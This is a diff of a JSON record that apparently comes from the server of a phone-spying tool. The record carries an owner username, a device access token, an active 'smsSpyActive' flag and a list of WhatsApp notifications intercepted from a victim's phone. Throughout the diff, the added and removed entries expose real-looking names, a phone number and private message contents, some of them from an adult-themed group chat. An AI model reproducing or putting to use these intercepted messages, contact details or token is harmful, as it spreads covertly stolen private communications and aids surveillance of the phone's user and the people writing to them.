@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776860391168,
+    "lastSeen": 1776860394815,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 823-1199-7104",
+        "content": "Balik sore kmr16 kemarin aku kasih di kmr17",
+        "time": "22/04 20:19",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776860397387
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Muhammad Amal Ardhafan",
+        "content": "Semangat ma disana",
+        "time": "22/04 20:19",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776860397371
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Menghapus pesan…",
+        "content": "‎5 dari 1193 (0%)",
+        "time": "22/04 20:19",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776860397164
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "Telepon video berlangsung",
+        "time": "22/04 20:19",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776860395294
+      },
       {
         "appName": "WhatsApp",
         "sender": "prily 🤍",
@@ -3987,38 +4019,6 @@
         "time": "22/04 15:14",
         "pkg": "com.whatsapp",
         "receivedAt": 1776842075911
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (57 pesan): ~ hyurά",
-        "content": "Sayonara @⁨~no⁩",
-        "time": "22/04 15:14",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776842075788
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "7Sex Message",
-        "content": "‎56 pesan baru",
-        "time": "22/04 15:14",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776842074860
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (56 pesan): ~ ᥬ--𝗛𝗔𝗠𝗭 || 𝗖𝘆𝗯𝗲𝗿​​᭄ツ",
-        "content": "📷 Dadah @⁨~no⁩\nSelamat Tinggal Dari Group 7Sex Message\n!\nPatuhi Rules Yang Ada\n\n.\nundefined\n",
-        "time": "22/04 15:14",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776842074733
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "7Sex Message",
-        "content": "‎53 pesan baru",
-        "time": "22/04 15:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776842007347
       }
     ],
     "galleryPhotos": [],
